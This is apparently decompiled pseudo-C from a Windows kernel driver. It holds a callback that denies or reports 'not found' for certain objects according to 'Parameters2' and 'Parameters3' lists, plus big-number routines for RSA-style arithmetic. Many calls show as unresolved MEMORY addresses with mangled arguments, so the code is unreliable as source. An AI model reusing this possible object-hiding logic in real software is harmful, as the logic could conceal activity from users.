__int64 __fastcall sub_60D8(__int64 a1, __int64 a2, int a3, __int64 a4)
{
  __int64 (__fastcall *v4)(); // rbx
  __int64 i; // rax
  __int64 v8; // r8
  __int64 result; // rax
  int v10; // eax
  int v11; // edx
  int v12; // r8d
  int v13; // r9d
  __int64 v14; // rdi
  int v15; // edx
  int v16; // r8d
  int v17; // r9d
  unsigned int v18; // ebx
  int v19; // edx
  int v20; // r8d
  int v21; // r9d
  _BYTE v22[16]; // [rsp+30h] [rbp-28h] BYREF
  __int128 v23; // [rsp+40h] [rbp-18h]

  v4 = sub_6704;
  v23 = 0LL;
  for ( i = *(_QWORD *)(a4 + 8); i; i = *(_QWORD *)(i + 16) )
  {
    v8 = *(_QWORD *)(i + 64);
    if ( v8 )
    {
      if ( !*(_DWORD *)v8 )
      {
        **(_QWORD **)(v8 + 8) = sub_6704;
        v4 = *(__int64 (__fastcall **)())(v8 + 16);
      }
      break;
    }
  }
  result = sub_2AF4(a1, a4, 2u, &qword_A090);
  if ( (int)result >= 0 )
  {
    v10 = sub_2AF4(a1, a4, 3u, &qword_A098);
    v14 = (unsigned int)v10;
    if ( v10 >= 0 )
    {
      sub_61EC(v10, a4, v11, a3, v12, v13);
      MEMORY[0x5002300360047005](v14, a4, L"320001", v22);
      result = MEMORY[0xF0145218000A3418](v14, a4, v22, v4, a4, 0LL);
      v18 = result;
      if ( (int)result >= 0 )
      {
        byte_A088 = 1;
      }
      else
      {
        sub_2A2C(v14, a4, v15, 50104, v16, v17);
        sub_2A2C(v14, a4, v19, 50124, v20, v21);
        return v18;
      }
    }
    else
    {
      sub_2A2C(v10, a4, v11, 50104, v12, v13);
      return (unsigned int)v14;
    }
  }
  return result;
}


// Function: sub_61EC at 0x61EC
__int64 __fastcall sub_61EC(
        __int64 a1,
        _DWORD a2,
        _DWORD a3,
        __int64 a4,
        _DWORD a5,
        _DWORD a6,
        __int64 a7,
        unsigned int a8,
        unsigned int a9,
        unsigned __int16 *a10)
{
  __int64 v10; // rsi
  __int64 v11; // rdx
  __int64 v12; // rcx
  unsigned __int16 v13; // r14
  _WORD *v14; // rbx
  __int64 v15; // r8
  __int64 v16; // rdx
  __int64 v17; // rcx
  _WORD *v18; // rbx
  __int64 v19; // r8
  __int64 v21; // [rsp+20h] [rbp-10h] BYREF
  _WORD *v22; // [rsp+28h] [rbp-8h]

  a10 = 0LL;
  a8 = 0;
  v10 = a4;
  if ( (int)sub_1898(a1, a4, (__int64)L"Parameters2", a4, (__int64 *)&a10, &a8) < 0 )
    goto LABEL_10;
  v11 = a8;
  if ( a8 > 4 )
  {
    v12 = (__int64)a10;
    v11 = a8 - 2;
    a8 -= 2;
    v13 = 0;
    a1 = *a10;
    v14 = a10 + 1;
    if ( !(_WORD)a1 )
      goto LABEL_8;
    while ( 1 )
    {
      v15 = (unsigned __int16)*v14;
      if ( (unsigned int)v11 < (unsigned __int64)(v15 + 2) )
        break;
      v21 = 0LL;
      v22 = v14 + 1;
      a8 = -2 - v15 + v11;
      WORD1(v21) = *v14;
      LOWORD(v21) = WORD1(v21);
      sub_5E64(a1, v10, &a9, (unsigned __int16 *)&v21);
      ++v13;
      v14 = (_WORD *)((char *)v14 + (unsigned __int16)*v14 + 2);
      if ( v13 >= (unsigned __int16)a1 )
        break;
      v11 = a8;
    }
  }
  v12 = (__int64)a10;
LABEL_8:
  if ( v12 )
    sub_1B84(a1, v10, v11, v12);
LABEL_10:
  a10 = 0LL;
  a8 = 0;
  if ( (int)sub_1898(a1, v10, (__int64)L"Parameters3", v10, (__int64 *)&a10, &a8) < 0 )
    return 0LL;
  v16 = a8;
  if ( a8 > 4 )
  {
    v17 = (__int64)a10;
    v16 = a8 - 2;
    a8 -= 2;
    v10 = 0LL;
    a1 = *a10;
    v18 = a10 + 1;
    if ( !(_WORD)a1 )
      goto LABEL_17;
    while ( 1 )
    {
      v19 = (unsigned __int16)*v18;
      if ( (unsigned int)v16 < (unsigned __int64)(v19 + 2) )
        break;
      v21 = 0LL;
      v22 = v18 + 1;
      a8 = -2 - v19 + v16;
      WORD1(v21) = *v18;
      LOWORD(v21) = WORD1(v21);
      sub_5ED4(a1, v10, &a9, (unsigned __int16 *)&v21);
      LOWORD(v10) = v10 + 1;
      v18 = (_WORD *)((char *)v18 + (unsigned __int16)*v18 + 2);
      if ( (unsigned __int16)v10 >= (unsigned __int16)a1 )
        break;
      v16 = a8;
    }
  }
  v17 = (__int64)a10;
LABEL_17:
  if ( v17 )
    sub_1B84(a1, v10, v16, v17);
  return 0LL;
}


// Function: sub_637C at 0x637C
__int64 __fastcall sub_637C(
        __int64 a1,
        __int64 a2,
        int *a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        int a8,
        unsigned int a9,
        unsigned __int64 a10)
{
  bool v10; // sf
  __int64 v12; // rbx
  __int64 v13; // rdx
  __int16 *v14; // rsi
  int v15; // eax
  __int64 v17; // [rsp+40h] [rbp-20h]
  __int128 v18; // [rsp+48h] [rbp-18h] BYREF

  a10 = 0LL;
  v10 = a3[2] < 0;
  v18 = 0LL;
  if ( !v10 && (int)MEMORY[0xA14027010E012](a3, a2, *(_QWORD *)a3, &qword_A0A0, 0LL, &a10) >= 0 )
  {
    v12 = *((_QWORD *)a3 + 2);
    if ( sub_606C((__int64)a3, a2, *(__int16 **)(v12 + 16), *(_DWORD *)(v12 + 12), (__int64)&v18) )
    {
      a8 = 0;
      sub_295C((__int64)a3, a2, a10, (_QWORD **)0xC3B8, (__int64)&v18, &a8);
      if ( a8 )
      {
        if ( (int)MEMORY[0xA130270105214](a3, a2, 512LL, *(_QWORD *)a3, 0LL, 983103LL) >= 0 )
        {
          v14 = (__int16 *)MEMORY[0x81E1A50023003](a3, a2, *(unsigned int *)(v12 + 24), 1LL, 1179806790LL);
          if ( v14 )
          {
            while ( 1 )
            {
              v15 = MEMORY[0xA641406090602](
                      a3,
                      v14,
                      (unsigned int)(a8 + *(_DWORD *)(v12 + 8)),
                      v17,
                      *(unsigned int *)(v12 + 12),
                      v14);
              if ( v15 == -2147483622 )
                break;
              if ( v15 < 0 || !sub_606C((__int64)a3, (__int64)v14, v14, *(_DWORD *)(v12 + 12), (__int64)&v18) )
                goto LABEL_13;
              if ( !sub_295C((__int64)a3, (__int64)v14, a10, (_QWORD **)0xC3B8, (__int64)&v18, &a8) )
              {
                **(_DWORD **)(v12 + 32) = a9;
                sub_7830(a3, v14, v14, *(_QWORD *)(v12 + 16), a9);
                goto LABEL_13;
              }
            }
            **(_DWORD **)(v12 + 32) = 0;
            *(_DWORD *)(v12 + 24) = 0;
            a3[6] = -1073741275;
LABEL_13:
            MEMORY[0x13640F06530602](a3, v14, 1179806790LL, v14);
          }
          MEMORY[0x6B6422006C7422](a3, v14, v13);
        }
      }
    }
  }
  return 0LL;
}


// Function: sub_651C at 0x651C
__int64 __fastcall sub_651C(
        __int64 a1,
        __int64 a2,
        int *a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        int a8,
        unsigned int a9,
        unsigned __int64 a10)
{
  bool v10; // sf
  __int64 v12; // rbx
  __int64 v13; // rdx
  __int64 v14; // rsi
  int v15; // eax
  __int64 v17; // [rsp+40h] [rbp-20h]
  __int128 v18; // [rsp+48h] [rbp-18h] BYREF

  a10 = 0LL;
  v10 = a3[2] < 0;
  v18 = 0LL;
  if ( !v10 && (int)MEMORY[0xA14027010E012](a3, a2, *(_QWORD *)a3, &qword_A0A0, 0LL, &a10) >= 0 )
  {
    v12 = *((_QWORD *)a3 + 2);
    if ( sub_60A0((__int64)a3, a2, *(_QWORD *)(v12 + 16), *(_DWORD *)(v12 + 12), (__int64)&v18) )
    {
      a8 = 0;
      sub_295C((__int64)a3, a2, a10, (_QWORD **)0xC3CC, (__int64)&v18, &a8);
      if ( a8 )
      {
        if ( (int)MEMORY[0xA130270105214](a3, a2, 512LL, *(_QWORD *)a3, 0LL, 983103LL) >= 0 )
        {
          v14 = MEMORY[0x81E1A50023003](a3, a2, *(unsigned int *)(v12 + 24), 1LL, 1179806790LL);
          if ( v14 )
          {
            while ( 1 )
            {
              v15 = MEMORY[0x8341400095414](
                      a3,
                      v14,
                      (unsigned int)(a8 + *(_DWORD *)(v12 + 8)),
                      v17,
                      *(unsigned int *)(v12 + 12),
                      v14);
              if ( v15 == -2147483622 )
                break;
              if ( v15 < 0 || !sub_60A0((__int64)a3, v14, v14, *(_DWORD *)(v12 + 12), (__int64)&v18) )
                goto LABEL_13;
              if ( !sub_295C((__int64)a3, v14, a10, (_QWORD **)0xC3CC, (__int64)&v18, &a8) )
              {
                **(_DWORD **)(v12 + 32) = a9;
                sub_7830(a3, v14, v14, *(_QWORD *)(v12 + 16), a9);
                goto LABEL_13;
              }
            }
            **(_DWORD **)(v12 + 32) = 0;
            *(_DWORD *)(v12 + 24) = 0;
            a3[6] = -1073741275;
LABEL_13:
            MEMORY[0x13640F06530602](a3, v14, 1179806790LL, v14);
          }
          MEMORY[0x6B6422006C7422](a3, v14, v13);
        }
      }
    }
  }
  return 0LL;
}


// Function: sub_66BC at 0x66BC
__int64 __fastcall sub_66BC(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  __int64 v6; // rbx
  int v9; // [rsp+0h] [rbp-28h]
  int v10; // [rsp+8h] [rbp-20h]
  int v11; // [rsp+10h] [rbp-18h]
  unsigned __int64 v12; // [rsp+18h] [rbp-10h]

  v6 = 0LL;
  if ( !*(_DWORD *)(a3 + 16) )
    return 0LL;
  while ( !sub_5FD0(a3, a2, *(_QWORD *)(*(_QWORD *)(a3 + 8) + 24 * v6), *(_QWORD *)a3, a5, a6, v9, v10, v11, v12) )
  {
    v6 = (unsigned int)(v6 + 1);
    if ( (unsigned int)v6 >= *(_DWORD *)(a3 + 16) )
      return 0LL;
  }
  return 3221226021LL;
}


// Function: sub_6704 at 0x6704
__int64 __fastcall sub_6704(
        __int64 a1,
        __int64 a2,
        int a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        double a7,
        double a8,
        double a9,
        double a10,
        double a11,
        double a12,
        __m128 a13,
        __int64 a14,
        int a15,
        unsigned int a16,
        unsigned __int64 a17)
{
  int v17; // edx
  int v18; // edx
  int v19; // edx
  int v20; // edx
  char v21; // al
  char v23; // al
  int v24; // edx
  int v25; // edx
  int v26; // edx
  __int64 v27; // [rsp+0h] [rbp-28h]
  unsigned __int64 v28; // [rsp+8h] [rbp-20h]
  __int64 v29; // [rsp+10h] [rbp-18h]
  unsigned __int64 v30; // [rsp+18h] [rbp-10h]

  if ( a3 <= 12 )
  {
    if ( a3 == 12 )
    {
LABEL_8:
      v21 = sub_2954(a1, a7, a8, a9, a10, a11, a12, a13, a2, *(__m128i **)a5, (__int64 **)0xC3B8);
      return v21 != 0 ? 0xC0000022 : 0;
    }
    v17 = a3 - 1;
    if ( v17 )
    {
      v18 = v17 - 1;
      if ( v18 )
      {
        v19 = v18 - 6;
        if ( v19 )
        {
          v20 = v19 - 1;
          if ( !v20 )
            return sub_66BC(a1, a2, a5, a4, a5, a6);
          if ( v20 == 1 )
            goto LABEL_8;
          return 0LL;
        }
      }
    }
    v23 = sub_5FD0(a1, a2, *(_QWORD *)(a5 + 8), *(_QWORD *)a5, a5, a6, v27, v28, v29, v30);
    return v23 != 0 ? 0xC0000225 : 0;
  }
  v24 = a3 - 20;
  if ( !v24 )
    return sub_637C(a1, a2, (int *)a5, a4, a5, a6, a14, a15, a16, a17);
  v25 = v24 - 1;
  if ( v25 )
  {
    v26 = v25 - 5;
    if ( !v26 )
    {
      v21 = sub_5F54(a7, a8, a9, a10, a11, a12, a13, a1, a2, *(_QWORD *)a5, *(_QWORD *)(a5 + 8), a5, a6, v27, v28, v29);
      return v21 != 0 ? 0xC0000022 : 0;
    }
    if ( v26 != 2 )
      return 0LL;
    v23 = sub_5F54(a7, a8, a9, a10, a11, a12, a13, a1, a2, *(_QWORD *)a5, *(_QWORD *)(a5 + 8), a5, a6, v27, v28, v29);
    return v23 != 0 ? 0xC0000225 : 0;
  }
  return sub_651C(a1, a2, (int *)a5, a4, a5, a6, a14, a15, a16, a17);
}


// Function: sub_67F4 at 0x67F4
__int64 __fastcall sub_67F4(
        _DWORD a1,
        _DWORD a2,
        __int64 a3,
        unsigned __int16 *a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10)
{
  unsigned __int16 v11; // cx
  unsigned __int16 v12; // ax
  unsigned int v13; // ebx
  unsigned __int64 v14; // rsi
  int v15; // eax

  a9 = a5;
  a10 = a6;
  v11 = *a4;
  if ( (v11 & 1) != 0 )
    return (unsigned int)-1073741811;
  v12 = a4[1];
  if ( (v12 & 1) != 0 )
    return (unsigned int)-1073741811;
  if ( v11 > v12 )
    return (unsigned int)-1073741811;
  if ( v12 == 0xFFFF )
    return (unsigned int)-1073741811;
  v13 = 0;
  if ( !*((_QWORD *)a4 + 1) && (v11 || v12) )
  {
    return (unsigned int)-1073741811;
  }
  else
  {
    v14 = (unsigned __int64)a4[1] >> 1;
    v15 = sub_7600(a4, v14, v14, *((_QWORD *)a4 + 1), a3, &a9);
    if ( v15 < 0 || v15 > v14 )
    {
      LOWORD(v15) = v14;
      v13 = -2147483643;
    }
    *a4 = 2 * v15;
  }
  return v13;
}


// Function: sub_6888 at 0x6888
__int64 __fastcall sub_6888(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5)
{
  int v5; // r8d
  unsigned int *i; // r9
  unsigned int v7; // eax

  v5 = a5 - 1;
  if ( v5 < 0 )
    return 0LL;
  for ( i = (unsigned int *)(a3 + 4LL * v5); ; --i )
  {
    v7 = *(unsigned int *)((char *)i + a4 - a3);
    if ( v7 > *i )
      break;
    if ( v7 < *i )
      return 0xFFFFFFFFLL;
    if ( --v5 < 0 )
      return 0LL;
  }
  return 1LL;
}


// Function: sub_68C0 at 0x68C0
__int64 __fastcall sub_68C0(__int64 a1, __int64 a2, unsigned int a3, _DWORD *a4, __int64 a5, int a6)
{
  __int64 result; // rax
  __int64 v8; // r9
  __int64 v10; // r10
  _DWORD *v11; // r11
  int v12; // r8d
  unsigned int v13; // ecx

  if ( a3 )
  {
    result = (unsigned int)(a6 - 1);
    v8 = (int)result;
    v10 = 0LL;
    v11 = a4;
    do
    {
      if ( v8 < 0 )
        break;
      v12 = 0;
      v13 = 0;
      do
      {
        if ( v13 >= 0x20 )
          break;
        result = *(unsigned __int8 *)(v8 + a5) << v13;
        v13 += 8;
        v12 |= result;
        --v8;
      }
      while ( v8 >= 0 );
      *v11 = v12;
      v10 = (unsigned int)(v10 + 1);
      ++v11;
    }
    while ( (unsigned int)v10 < a3 );
    if ( (unsigned int)v10 < a3 )
      return sub_7AF0(a5, a2, 0LL, &a4[v10], 4LL * (a3 - (unsigned int)v10));
  }
  return result;
}


// Function: sub_6938 at 0x6938
__int64 __fastcall sub_6938(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        int a5,
        unsigned int a6,
        int a7,
        int a8,
        __int64 a9,
        int a10,
        __int64 a11,
        unsigned int a12)
{
  __int64 result; // rax
  __int64 v14; // rcx
  __int64 v15; // rsi
  unsigned int v16; // ebx
  unsigned int v17; // ecx
  __int64 v18; // r13
  unsigned int i; // eax
  unsigned int v20; // r12d
  int v21; // edx
  __int64 v22; // rdi
  char *v23; // r13
  __int64 v24; // r9
  unsigned int v25; // r14d
  int v26; // r10d
  _DWORD *v27; // r9
  __int64 v28; // r11
  unsigned int v29; // edx
  unsigned __int64 v30; // r8
  unsigned int v31; // eax
  BOOL v32; // ecx
  unsigned int v33; // edx
  int v34; // r10d
  int v35; // r9d
  __int64 v36; // [rsp+0h] [rbp-100h]
  __int64 v37; // [rsp+8h] [rbp-F8h]
  int v39; // [rsp+20h] [rbp-E0h]
  unsigned int v40; // [rsp+28h] [rbp-D8h]
  char *v42; // [rsp+38h] [rbp-C8h]
  _DWORD v43[132]; // [rsp+40h] [rbp-C0h] BYREF
  _DWORD v44[260]; // [rsp+250h] [rbp+150h] BYREF

  result = a12 - 1;
  v14 = (int)result;
  v15 = a6;
  if ( (int)(a12 - 1) >= 0 )
  {
    do
    {
      if ( *(_DWORD *)(a11 + 4 * v14) )
        break;
      result = (unsigned int)(result - 1);
      --v14;
    }
    while ( v14 >= 0 );
  }
  v16 = result + 1;
  if ( (_DWORD)result != -1 )
  {
    v17 = *(_DWORD *)(a11 + 4 * result);
    v18 = (unsigned int)result;
    for ( i = 0; i < 0x20; ++i )
    {
      if ( !v17 )
        break;
      v17 >>= 1;
    }
    v20 = 32 - i;
    v40 = 32 - i;
    if ( v16 )
      sub_7AF0(a1, a6, 0LL, v44, 4LL * v16);
    v44[v15] = sub_708C(4 * (int)v15, v15, a5, (unsigned int)v44, v20, v15);
    sub_708C(4 * v15, v15, a11, (unsigned int)v43, v20, v16);
    v21 = v43[v18];
    v39 = v21;
    if ( (_DWORD)v15 )
    {
      sub_7AF0(4 * v15, v15, 0LL, a4, 4 * v15);
      v21 = v39;
    }
    v22 = (unsigned int)v15 - v16;
    if ( (int)(v15 - v16) >= 0 )
    {
      v23 = (char *)v44 + 4LL * (int)v22 - (_QWORD)v43;
      v42 = (char *)v43 + a4 - (_QWORD)v44;
      do
      {
        v24 = (unsigned int)v44[v15];
        if ( v21 == -1 )
          v25 = v44[v15];
        else
          v25 = ((v24 << 32) + (unsigned __int64)(unsigned int)v44[(unsigned int)(v15 - 1)]) / (unsigned int)(v21 + 1);
        v26 = 0;
        if ( v25 && v16 )
        {
          v27 = v43;
          v28 = v16;
          do
          {
            v29 = *(_DWORD *)&v23[(_QWORD)v27] - v26;
            v30 = v25 * (unsigned __int64)(unsigned int)*v27;
            v31 = ~(v25 * *v27);
            v32 = v29 > ~v26;
            v33 = v29 - v30;
            *(_DWORD *)&v23[(_QWORD)v27++] = v33;
            v34 = v32 + 1;
            if ( v33 <= v31 )
              v34 = v32;
            v26 = HIDWORD(v30) + v34;
            --v28;
          }
          while ( v28 );
          LODWORD(v24) = v44[v15];
        }
        v35 = v24 - v26;
        v44[v15] = v35;
        while ( v35 || (int)sub_6888(v22, v15, (__int64)v43, (__int64)&v44[v22], v16) >= 0 )
        {
          ++v25;
          v44[v15] -= sub_7168(
                        v22,
                        v15,
                        (unsigned int)&v44[v22],
                        (unsigned int)&v44[v22],
                        (unsigned int)v43,
                        v16,
                        v36,
                        v37);
          v35 = v44[v15];
        }
        v15 = (unsigned int)(v15 - 1);
        v21 = v39;
        *(_DWORD *)&v23[(_QWORD)v42] = v25;
        v23 -= 4;
        v22 = (unsigned int)(v22 - 1);
      }
      while ( (int)v22 >= 0 );
      v20 = v40;
    }
    if ( a12 )
      sub_7AF0(a3, v15, 0LL, a3, 4LL * a12);
    return sub_70F8(a3, v15, (unsigned int)v44, a3, v20, v16, v36, v37);
  }
  return result;
}


// Function: sub_6BE0 at 0x6BE0
__int64 __fastcall sub_6BE0(__int64 a1, __int64 a2, int a3, __int64 a4, unsigned int *a5, unsigned int a6)
{
  unsigned int v6; // ebx
  int v7; // r11d
  __int64 v9; // rdx
  unsigned int v10; // ecx
  __int64 result; // rax

  v6 = 0;
  v7 = a3 - 1;
  if ( a6 )
  {
    v9 = v7;
    do
    {
      if ( v9 < 0 )
        break;
      a1 = *a5;
      v10 = 0;
      do
      {
        if ( v10 >= 0x20 )
          break;
        --v7;
        result = (unsigned int)a1 >> v10;
        v10 += 8;
        *(_BYTE *)(v9 + a4) = result;
        --v9;
      }
      while ( v9 >= 0 );
      ++v6;
      ++a5;
    }
    while ( v6 < a6 );
  }
  if ( v7 >= 0 )
    return sub_7AF0(a1, a2, 0LL, a4, v7 + 1LL);
  return result;
}


// Function: sub_6C54 at 0x6C54
__int64 __fastcall sub_6C54(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        unsigned int a5,
        __int64 a6,
        int a7,
        int a8,
        int a9,
        __int64 a10,
        unsigned int a11)
{
  int v16; // [rsp+0h] [rbp-468h]
  int v17; // [rsp+8h] [rbp-460h]
  __int64 v18; // [rsp+10h] [rbp-458h]
  int v19; // [rsp+18h] [rbp-450h]
  _BYTE v20[1040]; // [rsp+30h] [rbp-438h] BYREF

  sub_7AF0(a4, a3, 0LL, v20, 1032LL);
  return sub_6938(a4, a3, a4, (__int64)v20, a3, a5, v16, v17, v18, v19, a6, a11);
}


// Function: sub_6CDC at 0x6CDC
__int64 __fastcall sub_6CDC(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        __int64 a11,
        unsigned int a12)
{
  __int64 v13; // r12
  __int64 v15; // rdi
  __int64 result; // rax
  __int64 v17; // r14
  int i; // r15d
  unsigned int v19; // ebx
  __int64 v20; // r12
  _DWORD v23[132]; // [rsp+40h] [rbp-C0h] BYREF
  _DWORD v24[129]; // [rsp+250h] [rbp+150h] BYREF
  _BYTE v25[516]; // [rsp+454h] [rbp+354h] BYREF
  char v26; // [rsp+658h] [rbp+558h] BYREF

  v13 = a5;
  if ( a12 )
    sub_7830(a3, a12, a3, v24, 4LL * a12);
  sub_6EC4(a3, a12, (unsigned int)v24, (unsigned int)v25, a3, a11);
  sub_6EC4(a3, a12, (unsigned int)v25, (unsigned int)&v26, a3, a11);
  if ( a12 )
    sub_7AF0(a3, a12, 0LL, v23, 4LL * a12);
  v15 = (unsigned int)(a6 - 1);
  v23[0] = 1;
  for ( result = (int)v15; result >= 0; --result )
  {
    if ( *(_DWORD *)(v13 + 4 * result) )
      break;
    v15 = (unsigned int)(v15 - 1);
  }
  v17 = (int)v15;
  for ( i = v15; v17 >= 0; --v17 )
  {
    v19 = *(_DWORD *)(v13 + 4 * v17);
    LODWORD(result) = 32;
    if ( i != (_DWORD)v15 || v19 >= 0x40000000 )
      goto LABEL_13;
    do
    {
      v19 *= 4;
      result = (unsigned int)(result - 2);
    }
    while ( v19 < 0x40000000 );
    if ( (_DWORD)result )
    {
LABEL_13:
      v20 = ((unsigned int)(result - 1) >> 1) + 1;
      do
      {
        sub_6EC4(v15, a12, (unsigned int)v23, (unsigned int)v23, (unsigned int)v23, a11);
        sub_6EC4(v15, a12, (unsigned int)v23, (unsigned int)v23, (unsigned int)v23, a11);
        result = v19 >> 30;
        if ( (_DWORD)result )
          result = sub_6EC4(v15, a12, (unsigned int)v23, (unsigned int)v23, (unsigned int)&v24[129 * result - 129], a11);
        v19 *= 4;
        --v20;
      }
      while ( v20 );
      v13 = a5;
    }
    --i;
  }
  if ( a12 )
    return sub_7830(v15, a12, v23, a4, 4LL * a12);
  return result;
}


// Function: sub_6EC4 at 0x6EC4
__int64 __fastcall sub_6EC4(
        _DWORD a1,
        _DWORD a2,
        int a3,
        __int64 a4,
        int a5,
        __int64 a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10,
        unsigned int a11)
{
  int v14; // [rsp+0h] [rbp-468h]
  int v15; // [rsp+8h] [rbp-460h]
  int v16; // [rsp+10h] [rbp-458h]
  __int64 v17; // [rsp+18h] [rbp-450h]
  _BYTE v18[1040]; // [rsp+30h] [rbp-438h] BYREF

  sub_6F30(a4, a6, a3, (unsigned int)v18, a5, a11);
  return sub_6C54(a4, a6, (__int64)v18, a4, 2 * a11, a6, v14, v15, v16, v17, a11);
}


// Function: sub_6F30 at 0x6F30
__int64 __fastcall sub_6F30(_DWORD a1, _DWORD a2, __int64 a3, __int64 a4, char *a5, int a6)
{
  __int64 v6; // rdi
  __int64 v10; // r15
  int v11; // r8d
  int v12; // edx
  __int64 result; // rax
  __int64 i; // rcx
  unsigned int v15; // r14d
  unsigned int v16; // r10d
  unsigned int v17; // ebp
  char *v18; // r9
  char *v19; // rbx
  unsigned int v20; // eax
  unsigned int v21; // r11d
  __int64 v22; // r12
  char *v23; // r15
  unsigned int v24; // ecx
  unsigned __int64 v25; // r8
  BOOL v26; // edx
  int v27; // r11d
  _DWORD v29[260]; // [rsp+30h] [rbp-458h] BYREF

  v6 = (unsigned int)(2 * a6);
  v10 = a4;
  if ( (_DWORD)v6 )
    sub_7AF0(v6, a5, 0LL, v29, 4LL * (unsigned int)v6);
  v11 = a6 - 1;
  v12 = a6 - 1;
  result = a6 - 1;
  for ( i = result; result >= 0; --result )
  {
    if ( *(_DWORD *)(a3 + 4 * result) )
      break;
    --v12;
  }
  v15 = v12 + 1;
  if ( v11 >= 0LL )
  {
    do
    {
      if ( *(_DWORD *)&a5[4 * i] )
        break;
      --v11;
      --i;
    }
    while ( i >= 0 );
  }
  v16 = 0;
  v17 = v11 + 1;
  if ( v12 != -1 )
  {
    v18 = (char *)((char *)v29 - a5);
    v19 = &a5[a3 - (_QWORD)v29];
    do
    {
      v20 = *(_DWORD *)&v18[(_QWORD)v19];
      v21 = 0;
      if ( v20 && v17 )
      {
        v22 = v17;
        v23 = a5;
        do
        {
          v24 = v21 + *(_DWORD *)&v18[(_QWORD)v23];
          v25 = v20 * (unsigned __int64)*(unsigned int *)v23;
          v26 = v24 < v21;
          *(_DWORD *)&v18[(_QWORD)v23] = v24 + v25;
          v27 = v26 + 1;
          if ( v24 + (unsigned int)v25 >= (unsigned int)v25 )
            v27 = v26;
          v23 += 4;
          v21 = HIDWORD(v25) + v27;
          --v22;
        }
        while ( v22 );
      }
      result = v16 + v17;
      v18 += 4;
      v29[result] += v21;
      ++v16;
    }
    while ( v16 < v15 );
    v10 = a4;
  }
  if ( (_DWORD)v6 )
    return sub_7830(v6, a5, v29, v10, 4LL * (unsigned int)v6);
  return result;
}


// Function: sub_708C at 0x708C
__int64 __fastcall sub_708C(_DWORD a1, _DWORD a2, __int64 a3, int *a4, unsigned int a5, __int64 a6)
{
  int *v7; // rbx
  char v9; // r10
  unsigned int v10; // r8d
  __int64 v11; // rdi
  unsigned int v12; // edx

  v7 = a4;
  if ( a5 >= 0x20 )
    return 0LL;
  v9 = 32 - a5;
  v10 = 0;
  if ( (_DWORD)a6 )
  {
    v11 = a3 - (_QWORD)a4;
    a6 = (unsigned int)a6;
    do
    {
      v12 = *(unsigned int *)((char *)v7 + v11) >> v9;
      *v7 = v10 | (*(int *)((char *)v7 + v11) << a5);
      ++v7;
      v10 = a5 != 0 ? v12 : 0;
      --a6;
    }
    while ( a6 );
  }
  return v10;
}


// Function: sub_70F8 at 0x70F8
__int64 __fastcall sub_70F8(__int64 a1, __int64 a2, __int64 a3, __int64 a4, unsigned int a5, int a6)
{
  int v8; // eax
  char v9; // r10
  unsigned int v10; // r8d
  __int64 v11; // r9
  int *v12; // rdi
  __int64 v13; // rbx
  int v14; // edx

  if ( a5 >= 0x20 )
    return 0LL;
  v8 = a6 - 1;
  v9 = 32 - a5;
  v10 = 0;
  v11 = a6 - 1;
  if ( v8 >= 0 )
  {
    v12 = (int *)(a4 + 4LL * v8);
    v13 = a3 - a4;
    do
    {
      v14 = *(int *)((char *)v12 + v13) << v9;
      *v12 = v10 | (*(unsigned int *)((char *)v12 + v13) >> a5);
      --v12;
      v10 = a5 != 0 ? v14 : 0;
      --v11;
    }
    while ( v11 >= 0 );
  }
  return v10;
}


// Function: sub_7168 at 0x7168
__int64 __fastcall sub_7168(__int64 a1, __int64 a2, __int64 a3, __int64 a4, _DWORD *a5, __int64 a6)
{
  unsigned int v6; // r10d
  __int64 v7; // rbx
  __int64 v8; // r11
  unsigned int v9; // ecx
  unsigned int v10; // ecx

  v6 = 0;
  if ( (_DWORD)a6 )
  {
    v7 = a3 - (_QWORD)a5;
    a6 = (unsigned int)a6;
    v8 = a4 - (_QWORD)a5;
    do
    {
      v9 = *(_DWORD *)((char *)a5 + v7) - v6;
      if ( v9 <= ~v6 )
      {
        v10 = v9 - *a5;
        v6 = v10 > ~*a5;
      }
      else
      {
        v10 = ~*a5;
      }
      *(_DWORD *)((char *)a5++ + v8) = v10;
      --a6;
    }
    while ( a6 );
  }
  return v6;
}


// Function: sub_71CC at 0x71CC
__int64 __fastcall sub_71CC(
        __int64 a1,
        __int64 a2,
        unsigned int *a3,
        __int64 a4,
        __int64 a5,
        int a6,
        int a7,
        int a8,
        __int64 a9,
        int a10,
        _DWORD *a11)
{
  int v13; // ebx
  int v14; // edi
  __int64 i; // rax
  __int64 v16; // rdi
  __int64 j; // rax
  unsigned int v19; // edx
  int v20; // [rsp+0h] [rbp-100h]
  int v21; // [rsp+8h] [rbp-F8h]
  int v22; // [rsp+10h] [rbp-F0h]
  int v23; // [rsp+18h] [rbp-E8h]
  _DWORD v24[132]; // [rsp+30h] [rbp-D0h] BYREF
  _DWORD v25[132]; // [rsp+240h] [rbp+140h] BYREF
  _DWORD v26[132]; // [rsp+450h] [rbp+350h] BYREF
  unsigned int v27[132]; // [rsp+660h] [rbp+560h] BYREF

  sub_68C0(129LL, a2, 0x81u, v26, a5, a6);
  sub_68C0(129LL, (__int64)a11, 0x81u, v24, (__int64)(a11 + 1), 512);
  sub_68C0(129LL, (__int64)a11, 0x81u, v25, (__int64)(a11 + 129), 512);
  v13 = 128;
  v14 = 128;
  for ( i = 128LL; i >= 0; --i )
  {
    if ( v24[i] )
      break;
    --v14;
  }
  v16 = (unsigned int)(v14 + 1);
  for ( j = 128LL; j >= 0; --j )
  {
    if ( v25[j] )
      break;
    --v13;
  }
  if ( (int)sub_6888(v16, (__int64)a11, (__int64)v24, (__int64)v26, v16) >= 0 )
    return 4097LL;
  sub_6CDC(v16, (__int64)a11, (__int64)v26, (__int64)v27, (__int64)v25, v13 + 1, v20, v21, v22, v23, (__int64)v24, v16);
  v19 = (unsigned int)(*a11 + 7) >> 3;
  *a3 = v19;
  sub_6BE0(v16, (__int64)a11, v19, a4, v27, v16);
  return 0LL;
}


